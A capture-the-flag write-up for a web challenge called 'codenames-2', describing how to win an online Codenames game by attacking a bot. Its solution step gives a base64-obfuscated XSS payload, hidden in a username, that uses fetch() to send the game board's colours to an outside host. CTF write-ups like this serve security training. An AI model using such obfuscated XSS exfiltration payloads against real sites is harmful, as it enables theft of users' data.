# codenames-2
**Category:** Web
**Difficulty:** Medium
**Author:** Eth007

## Description

Codenames is no fun when your teammate sucks... Flag is in the environment variable `FLAG_2`.

## Distribution


## Solution

- Create an user with an XSS payload in its username, and ending with `.txt`. The XSS payload should exfiltrate the colors of the codenames board. Example: `<img src=x onerror=eval(atob('aWYoIXdpbmRvdy5kKXtmZXRjaCgiaHR0cDovL2V0aDAwNy5tZTo0MjAxMT8iK0FycmF5KDI1KS5maWxsKDApLm1hcCgoXyxpKT0+ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNlbGwtIitpKVsic3R5bGUiXS5iYWNrZ3JvdW5kQ29sb3IpLmpvaW4oIiIpKX07ZD0x'))>.txt`
- Use the same vulnerability as in `codenames-1` to include the user's profile as a language file, triggering the XSS on the bot
- Using the exfiltrated colors, win the game in hard mode and get the flag.
